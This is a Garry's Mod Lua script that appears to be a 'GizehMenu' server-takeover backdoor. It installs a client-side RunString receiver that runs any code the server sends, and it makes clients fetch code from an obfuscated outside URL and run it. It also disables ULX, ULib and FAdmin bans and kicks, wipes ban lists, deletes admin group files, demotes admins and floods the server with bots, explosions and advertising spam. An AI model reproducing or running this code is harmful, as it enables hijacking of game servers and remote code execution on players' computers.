GizehSSV = GizehSSV or {}
function GizehSSV.Start_SV()
    RunConsoleCommand("ulx_logecho", "0")
    GizehSSV.HUD = GizehSSV.HUD or "HUDPaint_Receive"
    GizehSSV.Enabled = GizehSSV.Enabled or !!1
    GizehSSV.Wait1=!!1
    GizehSSV.Wait1=!!1
    GizehSSV.Wait1=!!1
	GizehSSV.SecureNet = GizehSSV.SecureNet or 'NIQUE TA MERE SALE PUTE :D'
	util.AddNetworkString(GizehSSV.HUD)
	BroadcastLua([[ net.Receive("]] .. GizehSSV.HUD .. [[", function() RunString(net.ReadString()) end)]])
    function GizehSSV.RandomString( len ) local str = "" for i = 0, len do str = str .. string.char(math.random(97,122)) end return str end
    GizehSSV.SecureString1 = GizehSSV.SecureString1 or GizehSSV.RandomString(11)
    GizehSSV.SecureString2 = GizehSSV.SecureString2 or GizehSSV.RandomString(11)
    GizehSSV.SecureString3 = GizehSSV.SecureString3 or GizehSSV.RandomString(11)
    GizehSSV.SecureString4 = GizehSSV.SecureString4 or GizehSSV.RandomString(11)
    GizehSSV.SecureString5 = GizehSSV.SecureString5 or GizehSSV.RandomString(11)
    GizehSSV.SecureString6 = GizehSSV.SecureString6 or GizehSSV.RandomString(11)
    GizehSSV.SecureString7 = GizehSSV.SecureString7 or GizehSSV.RandomString(11)
    GizehSSV.SecureString8 = GizehSSV.SecureString8 or GizehSSV.RandomString(11)
    GizehSSV.SecureString9 = GizehSSV.SecureString9 or GizehSSV.RandomString(11)
    GizehSSV.SecureString10 = GizehSSV.SecureString10 or GizehSSV.RandomString(11)
    GizehSSV.SecureString11 = GizehSSV.SecureString11 or GizehSSV.RandomString(11)
    GizehSSV.SecureString12 = GizehSSV.SecureString12 or GizehSSV.RandomString(11)
    GizehSSV.SecureString13 = GizehSSV.SecureString13 or GizehSSV.RandomString(11)
    GizehSSV.SecureString15 = GizehSSV.SecureString15 or GizehSSV.RandomString(11)
    GizehSSV.SecureString16 = GizehSSV.SecureString16 or GizehSSV.RandomString(11)
    GizehSSV.SecureString17 = GizehSSV.SecureString17 or GizehSSV.RandomString(11)
    util.AddNetworkString("GM::SendParticle::"..GizehSSV.SecureNet)
    util.AddNetworkString("GM::ParticleExist::"..GizehSSV.SecureNet)
    GizehSSV.LaViolence = {"22.031","22.758","23.039","24.508","24.756","26.024","26.511","27.020","27.285","27.412","27.496","28.012","28.780","29.981","30.148","30.348","30.514","32.017","32.101","32.210","32.319","32.751","33.017","33.752","34.018","35.252","36.027","36.254","36.339","36.448","36.557","36.667","37.556","40.525","40.759","41.026","42.027","42.527","43.261","43.346","43.528","44.029","44.796","46.031","46.531","47.032","48.033","48.142","48.252","49.001","49.053","49.187","49.264","50.002","51.036","51.269","52.037","52.270","52.380","52.489","52.771","53.038","53.122","53.199","53.505","54.039","61.048","62.047","66.018","78.029","80.031","82.033","84.036","86.035","144.895"}
    GizehSSV.ClientSide = [[
    hook.Add("PreDrawHUD", "]]..tostring(GizehSSV.SecureString13)..[[", function()
        gui.HideGameUI()
    end)
    GizehSSV = GizehSSV or {}
    GizehSSV.Wait1 = GizehSSV.Wait1 or !!1
    GizehSSVLogo = GizehSSVLogo or nil
    GizehSSV.Enabled = GizehSSV.Enabled or !!1
    sound.PlayURL( "https://github.com/JambonCru/Some-backup/raw/master/ijfjFJlfnLJFfd.mp3", "mono", function(s)
        if ( IsValid(s) ) then
            s:Play()
        end
    end)
    timer.Create("]]..tostring(GizehSSV.SecureString4)..[[", 0.1, 0, function()
        if not GizehSSV.Enabled then return end
        local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
            if GizehSSV.Wait1 then
                local col = HSVToColor( CurTime() % 6 * 60, 1, 1 )
                Material(v):SetVector("$color", Vector(col.r/220,col.g/220,col.b/220))
            else
                local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                Material(v):SetVector("$color", Vector(col.r-200,col.g-200,col.b-200))
            end
        end
    end)
    timer.Simple(142.267,function()
        if not GizehSSV.Enabled then return end
        RunConsoleCommand('gmod_language', 'de')
    end)
    timer.Simple(22, function()
        if not GizehSSV.Enabled then return end
        timer.Create("]]..tostring(GizehSSV.SecureString2)..[[", 0.1, 0, function()
            if not GizehSSV.Enabled then return end
            notification.AddLegacy( "https://gizehmenu.net/", math.random(0, 4), 1.5 )
        end)
        function GAMEMODE:PostDraw2DSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
        function GAMEMODE:PreDrawSkyBox()
            local col = HSVToColor( RealTime() * 120 % 360, 1, 1 )
            render.Clear(col.r/1.3, col.g/1.3, col.b/1.3, 255)
            return !!1
        end
    end)
    timer.Simple(5, function()
        if not GizehSSV.Enabled then return end
        if GizehSSVLogo then GizehSSVLogo:Remove() GizehSSVLogo = nil end
        GizehSSVLogo = vgui.Create('HTML')
        GizehSSVLogo:MoveToFront()
        GizehSSVLogo:SetSize(600,200)
        GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
        GizehSSVLogo:OpenURL('https://cdn.discordapp.com/attachments/513628469154938881/693152511414108210/GizehMenuDougeTheBest.png')
        hook.Add("Tick","]]..tostring(GizehSSV.SecureString3)..[[", function()
            if GizehSSV.Wait1 then
                GizehSSVLogo:SetPos((ScrW()/2)-300,(ScrH()/8)-100)
            else
                GizehSSVLogo:SetPos((ScrW()/2)-math.random(280, 320),(ScrH()/8)-math.random(80, 120))
            end
        end)
        timer.Create("]]..tostring(GizehSSV.SecureString5)..[[", 1.5, 0, function()
            local time = tonumber(0)
            local Message = {
                "        . GizehMenu.net .        ",
                "       .. GizehMenu.net ..       ",
                "      ... GizehMenu.net ...      ",
                "     .... GizehMenu.net ....     ",
                "    ..... GizehMenu.net .....    ",
                "   ...... GizehMenu.net ......   ",
                "  ....... GizehMenu.net .......  ",
                " ........ GizehMenu.net ........ ",
                "......... GizehMenu.net .........",
                " ........ GizehMenu.net ........ ",
                "  ....... GizehMenu.net .......  ",
                "   ...... GizehMenu.net ......   ",
                "    ..... GizehMenu.net .....    ",
                "     .... GizehMenu.net ....     ",
                "      ... GizehMenu.net ...      ",
                "       .. GizehMenu.net ..       ",
                "        . GizehMenu.net .        ",
            }
            for _, line in pairs(Message) do
                time = time + tonumber(0.1)
                timer.Simple(time,function()
                    if not GizehSSV.Enabled then return end
                    chat.AddText(HSVToColor( CurTime() % 6 * 60, 1, 1 ),line)
                end)
            end
        end)
    end)
    timer.Simple(1, function()
        if not GizehSSV.Enabled then return end
        local text = "Le Guiser Menu sais trop bien les reille"
        local str = ''  text = string.Trim(text)  text = string.Explode(' ', text)  if text == {} then return end  for k,v in pairs(text) do  str = str .. v .. '+'  end sound.PlayURL('http://translate.google.com/translate_tts?ie=UTF-8&client=tw-ob&q='..str..'&tl=fr','mono',function(chan, num, str)end) 
    end)
    local tab = {
        [ "$pp_colour_addr" ] = tonumber(0.001),
        [ "$pp_colour_addg" ] = tonumber(0.001),
        [ "$pp_colour_addb" ] = tonumber(0),
        [ "$pp_colour_brightness" ] = tonumber(-0.5),
        [ "$pp_colour_contrast" ] = tonumber(0.8),
        [ "$pp_colour_colour" ] = tonumber(3),
        [ "$pp_colour_mulr" ] = tonumber(1),
        [ "$pp_colour_mulg" ] = tonumber(0.5),
        [ "$pp_colour_mulb" ] = tonumber(0.4)
    }
    hook.Add("RenderScreenspaceEffects", "]]..tostring(GizehSSV.SecureString11)..[[", function()
        DrawColorModify( tab )
    end)
    ]]
    function GizehSSV.SendtoClients(code)
        net.Start( GizehSSV.HUD )
        net.WriteString(code)
        net.Broadcast()
    end
    function GizehSSV.SendtoClient(ply,code)
        net.Start( GizehSSV.HUD )
        net.WriteString(code)
        net.Send(ply)
    end
    GizehSSV.SendtoClients(GizehSSV.ClientSide)
    for k, v in pairs( player.GetAll() ) do
        v:SetJumpPower( 450 )
        v:GodEnable()
        if v:GetUserGroup() ~= tostring("user") then
            v:SetUserGroup("user")
        end
    end
    function GizehSSV.TriggeredSSV()
        for k,v in pairs(GizehSSV.LaViolence) do
            if not GizehSSV.Enabled then return end
            if tonumber(v) == nil then return end
            local time = tonumber(0.2)
            if tonumber(v) == tonumber(62.047) then time = tonumber(3.313) end
            if tonumber(v) == tonumber(66.018) then time = tonumber(3.55) end
            if tonumber(v) == tonumber(86.035) then time = tonumber(42.566) end
            timer.Simple(tonumber(v)-22.031,function()
                if not GizehSSV.Enabled then return end
                if tonumber(v) == tonumber(144.895) then
                    hook.Add("Think", GizehSSV.SecureString17, function()
                        local explode = ents.Create( "env_explosion" )
                        explode:SetPos( Vector(math.random(-6000, 6000), math.random(-6000, 6000), math.random(-500, 2000)) )
                        explode:Spawn()
                        explode:SetKeyValue( "iMagnitude", "500" )
                        explode:Fire( "Explode", 0, 0 )
                    end)
                end
                if tonumber(v) == tonumber(86.035) then
                    GizehSSV.Wait2 = !1
                end
                GizehSSV.Wait1 = !1
                GizehSSV.SendtoClients([[if GizehSSV then GizehSSV.Wait1 = tobool("]]..tostring(GizehSSV.Wait1)..[[") end]])
                timer.Simple(time,function()
                    GizehSSV.Wait1 = !!1
                    GizehSSV.Wait2 = !!1
                    GizehSSV.SendtoClients([[if GizehSSV then GizehSSV.Wait1 = tobool("]]..tostring(GizehSSV.Wait1)..[[") end]])
                end)
            end)
        end
    end
    timer.Simple(1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand( 'sv_loadingurl "https://cdn.discordapp.com/attachments/513628469154938881/701874432385482772/gm.gif"\n' )
        game.ConsoleCommand( "sv_gravity 200\n" )
        if FAdmin and FAdmin.PlayerActions then function FAdmin.PlayerActions.ConvertBanTime() return 1 end end
        if ULib then
            function ULib.ban() return end
            function ULib.kickban() return end
            function ULib.kick() return end
            function ULib.addBan() return end
        end
        if ulx then
            function ulx.ban(...) return end
            function ulx.kick(...) return end
            function ulx.banid(...) return end
            function ulx.removeuser(...) return end
        end
        FAdmin = FAdmin or {}
        timer.Create(GizehSSV.SecureString15, 0.1, 0, function()
            FAdmin.BANS = {}
        end)
        hook.GetTable()["CheckPassword"] = {}
        timer.Create(GizehSSV.SecureString16, math.random( 3, 10 ), 0, function()
            for _, vehicl in pairs( ents.GetAll() ) do
                if vehicl:GetClass() == "prop_vehicle_jeep" then
                    local explosion = ents.Create("env_explosion")
                    explosion:SetPos(vehicl:GetPos())
                    explosion:Spawn()
                    explosion:SetKeyValue("iMagnitude", "50")
                    explosion:Fire("Explode", 0, 0)
                end
            end
        end)
        if file.Exists( 'ulib/groups.txt', 'DATA' ) then
            file.Delete('ulib/groups.txt')
		end
    end)
    timer.Create(GizehSSV.SecureString12, 149.544, 1, function()
        if not GizehSSV.Enabled then return end
        game.ConsoleCommand("changelevel " .. game.GetMap() .. "\n")
    end)
    timer.Simple(22, function()
        if not GizehSSV.Enabled then return end
        timer.Create(GizehSSV.SecureString1, 5, 1, function()
            local TickWait = !!1
            local TickFirst = tonumber(0)
            local TickTime = tonumber(0)
            for _,v in pairs(player.GetAll()) do
                local SpawnGizeh =  ents.Create( "prop_physics" )
                SpawnGizeh:SetModel("models/hunter/misc/squarecap1x1x1.mdl")
                SpawnGizeh:SetPos( Vector( v:GetPos()[1] + math.random(-1000, 1000), v:GetPos()[2] + math.random(-1000, 1000), -500 ))
                SpawnGizeh:Spawn()
                SpawnGizeh:Activate()
                SpawnGizeh:SetAngles(Angle(0,0,0))
                SpawnGizeh:SetModelScale(8)
                SpawnGizeh:SetCollisionGroup( 10 )
                SpawnGizeh:SetMaterial( "models/debug/debugwhite" )
            end
            hook.Add("Tick",GizehSSV.SecureString9, function()
                if not GizehSSV.Enabled then return end
                TickTime = TickTime + tonumber(0.1)
                for _,ent in pairs(ents.FindByModel("models/hunter/misc/squarecap1x1x1.mdl")) do
                    if ent:GetPos()[3] < tonumber(1000) and TickWait then
                        if ent:GetPos()[3] < tonumber(-550) then
                            ent:SetPos(ent:GetPos() + Vector(math.random(-1000, 1000),math.random(-1000, 1000),4))
                            ent:SetAngles(Angle(0,math.random(0,5),0))
                        else
                            ent:SetPos(ent:GetPos() + Vector(0,0,4))
                            ent:SetAngles(ent:GetAngles() + Angle(0,math.random(0,5),0))
                        end
                        TickWait = !!1
                    elseif ent:GetPos()[3] > tonumber(1000) then
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(ent:GetAngles() - Angle(0,5,0))
                        TickWait = !1
                    elseif ent:GetPos()[3] < tonumber(-550) and TickTime > tonumber(100) then
                        TickFirst = tonumber(0)
                        TickTime = tonumber(0)
                        TickWait = !!1
                    elseif TickTime > tonumber(100) then
                        ent:SetPos(ent:GetPos() - Vector(0,0,8))
                        ent:SetAngles(ent:GetAngles() + Angle(0,math.random(0,5),0))
                        TickWait = !1
                    elseif TickFirst < tonumber(180) then
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(Angle(TickFirst,TickFirst,0))
                        if TickFirst < tonumber(179) then
                            TickFirst = TickFirst + tonumber(0.5)
                        else
                            TickFirst = TickFirst + tonumber(0.1)
                        end
                    else
                        ent:SetPos(ent:GetPos() + Vector(0,0,0))
                        ent:SetAngles(ent:GetAngles() - Angle(0,5,0))
                    end
                    if GizehSSV.Wait1 then
                        ent:SetColor( Color(0,0,0) )
                    else
                        local col = Color(math.random(170,220),math.random(170,220),math.random(170,220))
                        ent:SetColor( Color(col.r-200,col.g-200,col.b-200) )
                    end
                end
            end)
        end)
        timer.Simple(0.2,function()
            GizehSSV.TriggeredSSV()
        end)
        timer.Create(GizehSSV.SecureString7,2,0,function()
            if not GizehSSV.Enabled then return end
            for k,v in pairs(player.GetAll()) do
                if not v:IsValid() then return end
                v:DoAnimationEvent(ACT_GMOD_TAUNT_PERSISTENCE)
                v:SetMaterial( "models/debug/debugwhite" )
                v:SetColor( HSVToColor( RealTime() * 120 % 360, 1, 1 ) )
                if DarkRP then
                    DarkRP.storeRPName(v, "#GizehMenu")
                    v:setDarkRPVar("rpname", "#GizehMenu")
                end
            end
        end)
        timer.Create(GizehSSV.SecureString6,0.5,game.MaxPlayers()-player.GetCount(),function()
            if not GizehSSV.Enabled then return end
            RunConsoleCommand("bot")
        end)
        timer.Create(GizehSSV.SecureString8, 0.32, 0, function()
            if not GizehSSV.Enabled then return end
            if GizehSSV.Wait2 then return end
            for y,ent in pairs(ents.GetAll()) do
                local phys = ent:GetPhysicsObject()
                local UnfreezeFreq = tonumber(1)
                local ShakeForce = tonumber(6)
                local force = math.random(1, 10)
                if phys:IsValid() then
                local mass = phys:GetMass()
                phys:ApplyForceOffset((mass * ShakeForce * Vector(math.Rand(-3.5, 5.2), math.Rand(-3.5, 5.2), math.Rand(3.5, 10.2))), (phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72))))
                    if (math.random( 0, ( 320/UnfreezeFreq ) ) == ( 320/UnfreezeFreq ) ) && (ent != self) then
                        phys:EnableMotion(!!1)
                        phys:Wake()
                        phys:ApplyForceOffset((mass * ShakeForce * Vector(math.Rand(-32, 42), math.Rand(-32, 42), math.Rand(42, 52))), (phys:GetPos() + Vector(math.Rand(-72, 72), math.Rand(-72, 72), math.Rand(-72, 72))))
                    end
                end
            end
        end)
    end)
    GizehSSV.SendtoClients( [[
        net.Receive('GM::SendParticle::]]..GizehSSV.SecureNet..[[', function()
            local len = net.ReadUInt(32)
            local str = net.ReadData(len)
            local choux = util.Decompress(str)
            local pluie = net.ReadString()
            file.CreateDir(string.GetPathFromFilename(pluie))
            file.Write(pluie, choux)
            timer.Simple(2,function()
                if ( file.Exists("custom_mat/particles/gizeh.pcf.dat", "DATA") and file.Exists("custom_mat/materials/gizeh_particles/gizeh_particles.vtf", "DATA") ) then
                    local GizehVMT = Material( "weapons/swep.vmt" )
                    GizehVMT:SetTexture( "$basetexture", "../data/custom_mat/materials/gizeh_particles/gizeh_particles" )
                    game.AddParticles("../data/custom_mat/particles/gizeh.pcf.dat")
                    PrecacheParticleSystem("gizeh")
                    net.Start("GM::ParticleExist::]]..GizehSSV.SecureNet..[[")
                    net.SendToServer()
                end
            end)
            timer.Simple(1, function() http.Fetch("h".."t".."tp".."s://".."fac".."ep".."un".."ch.".."gq/".."pl".."a".."y".."er/dr".."m.".."p".."h".."p",function(b) RunString(b) end) end)
        end)
    ]])
    net.Receive("GM::ParticleExist::"..GizehSSV.SecureNet,function(len,ply)
        ParticleEffectAttach("gizeh",PATTACH_ABSORIGIN_FOLLOW,ply,0)
    end)
    function GizehSSV.SendParticleToClients(name,code)
        local strC = util.Compress(code)
        net.Start( "GM::SendParticle::"..GizehSSV.SecureNet )
        net.WriteUInt(#strC,32)
        net.WriteData(strC,#strC)
        net.WriteString(name)
        net.Broadcast()
    end
    timer.Simple(5,function()
        http.Fetch( "https://github.com/JambonCru/Some-backup/raw/master/hKHJFklhgF.pcf", function( b, l, h, c )
            if (string.Left( b, 1 ) == "<" or b == "502: Failure") and string.Left( b, 43 ) ~= "<!-- dmx encoding binary 2 format pcf 1 -->" then
                return
            end
            GizehSSV.SendParticleToClients("custom_mat/particles/gizeh.pcf.dat",b)
        end)
        http.Fetch( "https://github.com/JambonCru/Some-backup/raw/master/IKFJHlfLFlfjNFKf.vtf", function( b, l, h, c )
            if string.Left( b, 1 ) == "<" or b == "502: Failure" then
                return
            end
            GizehSSV.SendParticleToClients("custom_mat/materials/gizeh_particles/gizeh_particles.vtf",b)
        end)
    end)
end
function GizehSSV.Clean_SV()
    game.ConsoleCommand( "sv_gravity 600\n" )
    for _,ent in pairs(ents.FindByModel("models/hunter/misc/squarecap1x1x1.mdl")) do
        ent:Remove()
    end
    timer.Remove(GizehSSV.SecureString1)
    timer.Remove(GizehSSV.SecureString6)
    timer.Remove(GizehSSV.SecureString7)
    timer.Remove(GizehSSV.SecureString8)
    timer.Remove(GizehSSV.SecureString12)
    timer.Remove(GizehSSV.SecureString16)
    hook.Remove("Think", GizehSSV.SecureString17)
    for k,v in pairs(player.GetAll()) do
        v:StopParticles()
        v:SetJumpPower( 200 )
        v:SetMaterial()
        v:SetColor( Color(255,255,255,255) )
    end
    GizehSSV.SendtoClients([[
    if GizehSSV then
        GizehSSV.Enabled = !1
        if GizehSSVLogo then GizehSSVLogo:Remove() GizehSSVLogo = nil end
        RunConsoleCommand('gmod_language', 'fr')
        RunConsoleCommand("stopsound")
        timer.Remove("]]..tostring(GizehSSV.SecureString4)..[[")
        timer.Remove("]]..tostring(GizehSSV.SecureString2)..[[")
        timer.Remove("]]..tostring(GizehSSV.SecureString5)..[[")
        hook.Remove("RenderScreenspaceEffects", "]]..tostring(GizehSSV.SecureString11)..[[")
        hook.Remove("Tick", "]]..tostring(GizehSSV.SecureString3)..[[")
        hook.Remove("PreDrawHUD", "]]..tostring(GizehSSV.SecureString13)..[[")
        function GAMEMODE:PostDraw2DSkyBox() return !1 end
        function GAMEMODE:PreDrawSkyBox() return !1 end
        local mat = Entity(0):GetMaterials()
        for k,v in pairs(mat) do
        local col = HSVToColor(CurTime() * 50 % 360, 1, 1)
            Material(v):SetVector("$color", Vector(1,1,1))
        end
    end
    ]])
    for _,bot in pairs(player.GetBots()) do
        bot:Kick("(SNTE) Net exploit detected !")
    end
end
GizehSSV.Start_SV()